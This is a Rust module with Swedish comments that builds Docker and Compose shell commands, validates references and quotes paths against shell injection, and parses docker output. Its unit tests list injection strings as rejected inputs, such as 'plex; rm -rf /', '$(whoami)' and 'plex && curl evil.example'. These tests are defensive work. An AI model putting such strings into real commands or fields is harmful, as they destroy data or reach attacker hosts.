//! Port av Sources/SSHCore/DockerService.swift. Rena, testbara funktioner
//! (kommandobyggare + parsning) + validering som förhindrar shell-injektion
//! — containerreferenser sätts ALDRIG in i ett kommando ovaliderade.

#[derive(Debug, Clone, PartialEq)]
pub struct DockerContainer {
    pub id: String,
    pub name: String,
    pub image: String,
    pub status: String,
}

impl DockerContainer {
    /// Härleds ur statustexten ("Up 3 days" = igång, "Exited (0)…" = stoppad).
    pub fn is_running(&self) -> bool {
        self.status.starts_with("Up")
    }
}

/// Docker-namn: `[a-zA-Z0-9][a-zA-Z0-9_.-]*`, max 128 tecken. Korta/långa id:n
/// är hex och matchar samma mönster. Allt annat avvisas — annars vore
/// `"name; rm -rf /"` en injektion rakt in i ett shell-kommando.
pub fn validate(reference: &str) -> Result<&str, String> {
    let mut chars = reference.chars();
    let first_ok = chars.next().is_some_and(|c| c.is_ascii_alphanumeric());
    let rest_ok = chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.' || c == '-');
    if first_ok && rest_ok && reference.len() <= 128 {
        Ok(reference)
    } else {
        Err(format!("ogiltig container-referens: {reference:?}"))
    }
}

const LIST_FORMAT: &str = "{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}";

pub fn list_command(all: bool) -> String {
    format!("docker ps{} --format '{LIST_FORMAT}' 2>/dev/null", if all { " -a" } else { "" })
}

pub fn start_command(reference: &str) -> Result<String, String> {
    Ok(format!("docker start {}", validate(reference)?))
}

pub fn stop_command(reference: &str) -> Result<String, String> {
    Ok(format!("docker stop {}", validate(reference)?))
}

pub fn restart_command(reference: &str) -> Result<String, String> {
    Ok(format!("docker restart {}", validate(reference)?))
}

pub fn logs_command(reference: &str, tail: i64) -> Result<String, String> {
    let n = tail.max(1);
    Ok(format!("docker logs --tail {n} {} 2>&1", validate(reference)?))
}

/// Interaktiv shell i en container — körs via samma PTY-kanal som en vanlig
/// terminalsession (`ssh::spawn_shell` med detta som `startup_command`),
/// därav `-it`. Faller tillbaka till `sh` om `bash` saknas.
pub fn exec_shell_command(reference: &str) -> Result<String, String> {
    let r = validate(reference)?;
    Ok(format!("docker exec -it {r} sh -c 'command -v bash >/dev/null && exec bash || exec sh'"))
}

/// Image-referenser går INTE genom [`validate`].
///
/// Den regeln är gjord för containernamn och id:n, och avvisar `/` och
/// `:` — alltså precis de tecken som varje namnrymdad image innehåller
/// (`ghcr.io/blixten85/bastion:1.0`). Hade den återanvänts här vore
/// följden att allt utom de kortaste officiella imagenamnen avvisades.
///
/// Tillåtna tecken är de som faktiskt förekommer i en referens: alnum,
/// punkt, understreck, bindestreck, snedstreck, kolon och `@` (för
/// digest-referenser som `image@sha256:…`). Inget av dem betyder något
/// för ett shell. Allt annat avvisas — mellanslag, semikolon, citattecken
/// och `$` hade annars varit en injektion rakt in i kommandot.
pub fn validate_image(reference: &str) -> Result<&str, String> {
    let mut chars = reference.chars();
    let first_ok = chars.next().is_some_and(|c| c.is_ascii_alphanumeric());
    let rest_ok = chars.all(|c| {
        c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-' | '/' | ':' | '@')
    });
    if first_ok && rest_ok && reference.len() <= 255 {
        Ok(reference)
    } else {
        Err(format!("ogiltig image-referens: {reference:?}"))
    }
}

/// En image i registret på värden.
#[derive(Debug, Clone, PartialEq)]
pub struct DockerImage {
    pub id: String,
    pub repository: String,
    pub tag: String,
    pub size: String,
}

impl DockerImage {
    /// Docker visar `<none>` för både repo och tagg på en image som inget
    /// längre pekar på. De är skräp som tar diskplats, och att kunna se
    /// dem som just skräp är hela poängen med att lista images.
    pub fn is_dangling(&self) -> bool {
        self.repository == "<none>" || self.tag == "<none>"
    }

    /// Vad man skriver för att referera till imagen. En dinglande image
    /// har inget namn att referera med — då är id:t det enda som finns.
    pub fn reference(&self) -> String {
        if self.is_dangling() {
            self.id.clone()
        } else {
            format!("{}:{}", self.repository, self.tag)
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct DockerVolume {
    pub name: String,
    pub driver: String,
}

#[derive(Debug, Clone, PartialEq)]
pub struct DockerNetwork {
    pub id: String,
    pub name: String,
    pub driver: String,
    pub scope: String,
}

impl DockerNetwork {
    /// `bridge`, `host` och `none` skapas av Docker självt och går inte
    /// att ta bort. Att erbjuda knappen ändå ger bara ett felmeddelande.
    pub fn is_builtin(&self) -> bool {
        matches!(self.name.as_str(), "bridge" | "host" | "none")
    }
}

const IMAGE_FORMAT: &str = "{{.ID}}|{{.Repository}}|{{.Tag}}|{{.Size}}";
const VOLUME_FORMAT: &str = "{{.Name}}|{{.Driver}}";
const NETWORK_FORMAT: &str = "{{.ID}}|{{.Name}}|{{.Driver}}|{{.Scope}}";

pub fn images_command() -> String {
    format!("docker images --format '{IMAGE_FORMAT}' 2>/dev/null")
}

pub fn volumes_command() -> String {
    format!("docker volume ls --format '{VOLUME_FORMAT}' 2>/dev/null")
}

pub fn networks_command() -> String {
    format!("docker network ls --format '{NETWORK_FORMAT}' 2>/dev/null")
}

pub fn remove_image_command(reference: &str) -> Result<String, String> {
    Ok(format!("docker rmi {}", validate_image(reference)?))
}

pub fn remove_volume_command(name: &str) -> Result<String, String> {
    Ok(format!("docker volume rm {}", validate(name)?))
}

pub fn remove_network_command(name: &str) -> Result<String, String> {
    Ok(format!("docker network rm {}", validate(name)?))
}

/// Hämtar en nyare version av imagen. Startar INTE om något — att byta ut
/// en körande container är ett separat beslut med driftkonsekvenser, och
/// en `pull` går alltid att låta bli att agera på.
pub fn pull_image_command(reference: &str) -> Result<String, String> {
    Ok(format!("docker pull {} 2>&1", validate_image(reference)?))
}

/// Ett Compose-projekt på värden.
#[derive(Debug, Clone, PartialEq)]
pub struct ComposeProject {
    pub name: String,
    /// Docker Composes egen sammanfattning, t.ex. `running(3)` eller
    /// `exited(2)`. Lämnas som den är — den bär både tillstånd och antal,
    /// och att plocka isär den vore att gissa om ett format som inte är
    /// dokumenterat som stabilt.
    pub status: String,
    /// Sökvägen till projektets compose-fil(er). Kommaseparerad när
    /// projektet är byggt av flera filer (`-f a.yml -f b.yml`).
    pub config_files: String,
}

impl ComposeProject {
    pub fn is_running(&self) -> bool {
        self.status.starts_with("running")
    }
}

/// Citerar en sökväg för ett POSIX-shell.
///
/// Compose-filernas sökvägar är godtyckliga och kan innehålla mellanslag
/// — de går alltså INTE genom [`validate`], som skulle avvisa dem. Inom
/// enkla citattecken är varje tecken utom `'` självt literalt i POSIX sh,
/// så regeln blir: avvisa sökvägar som innehåller `'`, citera resten.
///
/// Det är en starkare garanti än en teckenlista, eftersom den inte
/// behöver räkna upp vad som är farligt — bara vad som bryter citatet.
fn quote_path(path: &str) -> Result<String, String> {
    if path.contains('\'') {
        return Err(format!("sökvägen innehåller citattecken och går inte att citera säkert: {path:?}"));
    }
    if path.is_empty() {
        return Err("tom sökväg".to_string());
    }
    Ok(format!("'{path}'"))
}

/// Bygger `docker compose -f … <verb>` för ett projekt.
///
/// `-f` med projektets egna filer, inte `-p` med namnet: `-p` ensamt
/// hittar inga tjänster utan en compose-fil i arbetskatalogen, och vi vet
/// inte var på värden man råkar stå. Filerna kommer från `docker compose
/// ls`, alltså från Docker självt.
fn compose_command(config_files: &str, verb: &str) -> Result<String, String> {
    let mut args = String::new();
    for file in config_files.split(',') {
        let file = file.trim();
        if file.is_empty() {
            continue;
        }
        args.push_str(&format!("-f {} ", quote_path(file)?));
    }
    if args.is_empty() {
        return Err("projektet saknar compose-filer".to_string());
    }
    Ok(format!("docker compose {args}{verb}"))
}

pub fn compose_ls_command() -> String {
    // `--all` tar med stoppade projekt. Ett projekt man vill starta är
    // per definition stoppat, så utan flaggan syns inte det man söker.
    "docker compose ls --all --format json 2>/dev/null".to_string()
}

pub fn compose_up_command(config_files: &str) -> Result<String, String> {
    compose_command(config_files, "up -d 2>&1")
}

pub fn compose_down_command(config_files: &str) -> Result<String, String> {
    compose_command(config_files, "down 2>&1")
}

pub fn compose_restart_command(config_files: &str) -> Result<String, String> {
    compose_command(config_files, "restart 2>&1")
}

pub fn compose_logs_command(config_files: &str, tail: i64) -> Result<String, String> {
    let n = tail.max(1);
    compose_command(config_files, &format!("logs --tail {n} 2>&1"))
}

/// `docker compose ls --format json` ger en JSON-array. Fälten heter
/// `Name`, `Status` och `ConfigFiles` med versal begynnelsebokstav.
///
/// Trasig eller tom utdata ger en tom lista i stället för ett fel: en
/// värd utan Docker Compose svarar ingenting alls efter `2>/dev/null`,
/// och det är inte ett fel som förtjänar en röd rad — det betyder bara
/// att det inte finns några projekt.
pub fn parse_compose_projects(output: &str) -> Vec<ComposeProject> {
    let Ok(value) = serde_json::from_str::<serde_json::Value>(output.trim()) else {
        return Vec::new();
    };
    let Some(array) = value.as_array() else {
        return Vec::new();
    };
    array
        .iter()
        .filter_map(|item| {
            let name = item.get("Name")?.as_str()?.to_string();
            if name.is_empty() {
                return None;
            }
            Some(ComposeProject {
                name,
                status: item.get("Status").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                config_files: item
                    .get("ConfigFiles")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string(),
            })
        })
        .collect()
}

/// Delar en rad på `|` och kräver minst så många fält som utdataformatet
/// lovar. Gemensam för alla fyra listningarna: en rad som inte ser ut som
/// data (tomrad, felutskrift som slunkit förbi `2>/dev/null`) ska hoppas
/// över, inte bli en post med tomma fält.
fn split_fields(line: &str, expected: usize) -> Option<Vec<&str>> {
    let fields: Vec<&str> = line.split('|').collect();
    if fields.len() < expected || fields[0].is_empty() {
        return None;
    }
    Some(fields)
}

pub fn parse_images(output: &str) -> Vec<DockerImage> {
    output
        .lines()
        .filter_map(|line| {
            let f = split_fields(line, 4)?;
            Some(DockerImage {
                id: f[0].to_string(),
                repository: f[1].to_string(),
                tag: f[2].to_string(),
                size: f[3].to_string(),
            })
        })
        .collect()
}

pub fn parse_volumes(output: &str) -> Vec<DockerVolume> {
    output
        .lines()
        .filter_map(|line| {
            let f = split_fields(line, 2)?;
            Some(DockerVolume { name: f[0].to_string(), driver: f[1].to_string() })
        })
        .collect()
}

pub fn parse_networks(output: &str) -> Vec<DockerNetwork> {
    output
        .lines()
        .filter_map(|line| {
            let f = split_fields(line, 4)?;
            Some(DockerNetwork {
                id: f[0].to_string(),
                name: f[1].to_string(),
                driver: f[2].to_string(),
                scope: f[3].to_string(),
            })
        })
        .collect()
}

pub fn parse_list(output: &str) -> Vec<DockerContainer> {
    output
        .lines()
        .filter_map(|line| {
            let f: Vec<&str> = line.split('|').collect();
            if f.len() < 4 || f[0].is_empty() {
                return None;
            }
            Some(DockerContainer {
                id: f[0].to_string(),
                name: f[1].to_string(),
                image: f[2].to_string(),
                status: f[3].to_string(),
            })
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_accepts_real_references() {
        for ok in ["plex", "a1b2c3d4e5f6", "my_app.1", "web-1", "Radarr"] {
            assert_eq!(validate(ok), Ok(ok));
        }
    }

    #[test]
    fn validate_rejects_injection() {
        for bad in [
            "plex; rm -rf /", "a b", "$(whoami)", "`id`", "a|b", "a&&b", "", "-flag", "x\ny",
            "a'b", "a\"b", "a>b",
        ] {
            assert!(validate(bad).is_err(), "borde ha avvisat {bad:?}");
        }
    }

    #[test]
    fn command_builders_match_reference_implementation() {
        assert_eq!(start_command("plex").unwrap(), "docker start plex");
        assert_eq!(stop_command("plex").unwrap(), "docker stop plex");
        assert_eq!(restart_command("plex").unwrap(), "docker restart plex");
        assert_eq!(logs_command("plex", 100).unwrap(), "docker logs --tail 100 plex 2>&1");
        assert_eq!(logs_command("plex", 0).unwrap(), "docker logs --tail 1 plex 2>&1");
        assert_eq!(
            list_command(true),
            "docker ps -a --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null"
        );
        assert_eq!(
            list_command(false),
            "docker ps --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null"
        );
    }

    #[test]
    fn injection_cannot_reach_command_builder() {
        assert!(stop_command("plex; rm -rf /").is_err());
    }

    /// Regressionen som fanns inbyggd i den enkla lösningen: `validate`
    /// är gjord för containernamn och avvisar `/` och `:`, alltså precis
    /// det varje namnrymdad image innehåller. Hade den återanvänts för
    /// images vore i princip allt utom `nginx` obrukbart.
    #[test]
    fn namespaced_image_references_are_accepted_where_container_names_are_not() {
        for reference in [
            "nginx",
            "nginx:1.27",
            "linuxserver/plex:latest",
            "ghcr.io/blixten85/bastion:1.0",
            "registry.example.se:5000/team/app:2026-08-18",
            "busybox@sha256:abc123",
        ] {
            assert!(validate_image(reference).is_ok(), "{reference} skulle accepterats");
        }
        // Samma referenser genom containerregeln — visar att de två
        // faktiskt skiljer sig och att den här funktionen behövs.
        assert!(validate("linuxserver/plex:latest").is_err());
    }

    #[test]
    fn image_injection_cannot_reach_command_builder() {
        for bad in [
            "plex; rm -rf /",
            "plex && curl evil.example",
            "plex$(whoami)",
            "plex `id`",
            "plex|tee /etc/passwd",
            "'plex'",
        ] {
            assert!(validate_image(bad).is_err(), "{bad:?} skulle avvisats");
            assert!(remove_image_command(bad).is_err());
            assert!(pull_image_command(bad).is_err());
        }
    }

    #[test]
    fn dangling_images_are_referenced_by_id_since_they_have_no_name() {
        let out = "sha1|<none>|<none>|142MB\nsha2|nginx|1.27|54MB";
        let images = parse_images(out);
        assert_eq!(images.len(), 2);

        assert!(images[0].is_dangling());
        assert_eq!(images[0].reference(), "sha1", "utan namn är id:t det enda som går att peka på");

        assert!(!images[1].is_dangling());
        assert_eq!(images[1].reference(), "nginx:1.27");
    }

    /// En image kan ha repo men sakna tagg (`<none>`) — den räknas också
    /// som dinglande, för `repo:<none>` är inget man kan referera till.
    #[test]
    fn an_image_with_a_repository_but_no_tag_is_also_dangling() {
        let image = &parse_images("sha3|myapp|<none>|20MB")[0];
        assert!(image.is_dangling());
        assert_eq!(image.reference(), "sha3");
    }

    #[test]
    fn volumes_and_networks_parse_their_own_field_counts() {
        let volumes = parse_volumes("data|local\nbackup|local");
        assert_eq!(volumes.len(), 2);
        assert_eq!(volumes[0].name, "data");
        assert_eq!(volumes[1].driver, "local");

        let networks = parse_networks("n1|bridge|bridge|local\nn2|mitt-nat|bridge|local");
        assert_eq!(networks.len(), 2);
        assert!(networks[0].is_builtin(), "bridge går inte att ta bort");
        assert!(!networks[1].is_builtin());
    }

    /// Skräprader ska hoppas över, inte bli poster med tomma fält. En
    /// tomrad i slutet av utdatan är det vanliga fallet.
    #[test]
    fn malformed_lines_are_skipped_rather_than_becoming_empty_entries() {
        assert!(parse_images("").is_empty());
        assert!(parse_images("\n\n").is_empty());
        assert!(parse_images("bara-ett-falt").is_empty(), "för få fält ska avvisas");
        assert!(parse_volumes("|local").is_empty(), "tomt förstafält ska avvisas");

        // Giltiga rader mitt bland skräp ska överleva.
        let images = parse_images("\nsha1|nginx|1.27|54MB\ntrasig\n");
        assert_eq!(images.len(), 1);
        assert_eq!(images[0].repository, "nginx");
    }

    #[test]
    fn builtin_networks_are_the_three_docker_creates_itself() {
        for name in ["bridge", "host", "none"] {
            let n = DockerNetwork {
                id: "x".into(),
                name: name.into(),
                driver: "bridge".into(),
                scope: "local".into(),
            };
            assert!(n.is_builtin(), "{name} skapas av Docker och går inte att ta bort");
        }
    }

    /// Compose-filernas sökvägar är godtyckliga och kan innehålla
    /// mellanslag — de kan alltså INTE gå genom `validate`, som skulle
    /// avvisa dem. Citeringen är regeln i stället.
    #[test]
    fn compose_paths_with_spaces_survive_but_quote_injection_does_not() {
        let cmd = compose_up_command("/srv/mina projekt/docker-compose.yml").unwrap();
        assert_eq!(cmd, "docker compose -f '/srv/mina projekt/docker-compose.yml' up -d 2>&1");

        // Enkelt citattecken är det ENDA som bryter citeringen, och det
        // avvisas därför — allt annat är literalt inom '...'.
        for bad in [
            "/srv/x'; rm -rf / #",
            "/srv/'$(whoami)'",
        ] {
            assert!(compose_up_command(bad).is_err(), "{bad:?} skulle avvisats");
            assert!(compose_down_command(bad).is_err());
        }

        // Tecken som vore farliga OCITERADE ska passera, för de är det
        // inte inom citattecken — annars vore regeln onödigt sträng.
        let cmd = compose_up_command("/srv/a$b;c/docker-compose.yml").unwrap();
        assert!(cmd.contains("'/srv/a$b;c/docker-compose.yml'"));
    }

    #[test]
    fn a_compose_project_built_from_several_files_gets_one_f_per_file() {
        let cmd = compose_restart_command("/srv/a.yml,/srv/b.yml").unwrap();
        assert_eq!(cmd, "docker compose -f '/srv/a.yml' -f '/srv/b.yml' restart 2>&1");
    }

    #[test]
    fn a_project_without_compose_files_is_an_error_not_a_bare_command() {
        // Utan `-f` hade kommandot körts mot vad som råkar ligga i
        // arbetskatalogen på värden — alltså fel projekt, tyst.
        assert!(compose_up_command("").is_err());
        assert!(compose_up_command(" , ").is_err());
    }

    #[test]
    fn compose_projects_parse_from_dockers_own_json() {
        let out = r#"[
            {"Name":"webb","Status":"running(3)","ConfigFiles":"/srv/webb/docker-compose.yml"},
            {"Name":"backup","Status":"exited(1)","ConfigFiles":"/srv/backup/compose.yml"}
        ]"#;
        let projects = parse_compose_projects(out);
        assert_eq!(projects.len(), 2);
        assert_eq!(projects[0].name, "webb");
        assert!(projects[0].is_running());
        assert_eq!(projects[1].name, "backup");
        assert!(!projects[1].is_running(), "exited ska inte räknas som igång");
    }

    /// En värd utan Docker Compose svarar ingenting alls efter
    /// `2>/dev/null`. Det är inte ett fel — det betyder att det inte
    /// finns några projekt, och ska ge en tom lista, inte en krasch.
    #[test]
    fn missing_or_broken_compose_output_yields_an_empty_list() {
        assert!(parse_compose_projects("").is_empty());
        assert!(parse_compose_projects("   ").is_empty());
        assert!(parse_compose_projects("inte json alls").is_empty());
        assert!(parse_compose_projects("{}").is_empty(), "objekt är inte en array");
        assert!(parse_compose_projects("[]").is_empty());
        assert!(
            parse_compose_projects(r#"[{"Status":"running(1)"}]"#).is_empty(),
            "en post utan namn är inte ett projekt"
        );
    }

    #[test]
    fn compose_ls_includes_stopped_projects() {
        // Ett projekt man vill STARTA är per definition stoppat — utan
        // --all syns aldrig det man söker.
        assert!(compose_ls_command().contains("--all"));
    }

    #[test]
    fn parse_list_running_and_stopped() {
        let out = "a1b2c3|plex|linuxserver/plex:latest|Up 3 days\nd4e5f6|old|busybox|Exited (0) 2 hours ago";
        let list = parse_list(out);
        assert_eq!(list.len(), 2);
        assert_eq!(list[0].name, "plex");
        assert!(list[0].is_running());
        assert_eq!(list[1].name, "old");
        assert!(!list[1].is_running());
    }
}
